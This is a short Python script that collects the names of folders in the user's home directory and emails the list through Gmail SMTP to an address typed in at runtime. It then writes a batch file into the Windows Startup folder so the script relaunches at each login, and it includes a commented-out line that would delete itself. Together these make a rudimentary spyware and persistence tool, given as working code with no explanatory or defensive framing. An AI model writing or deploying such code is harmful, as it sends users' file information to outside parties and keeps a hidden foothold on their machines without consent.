import smtplib, ssl, os.path
import getpass
from os import remove
from sys import argv

USER_NAME = getpass.getuser()

homeDir = os.path.expanduser("~")
folders = os.listdir(homeDir)

data = []

for f in folders:
    data.append(f)

port = 465
senderEmail = input("Enter sender email : ")
password = input("Enter password of email : ")
receiverEmail = input("Enter receiver email : ")

message = str(data)
context = ssl.create_default_context()

with smtplib.SMTP_SSL("smtp.gmail.com", port, context=context) as server:
    server.login(senderEmail, password)
    server.sendmail(senderEmail, receiverEmail, message)

print("done")

def add_to_startup(file_path=""):
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__))
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
        bat_file.write(r'start "" %s' % file_path)

#remove(argv[0])
add_to_startup()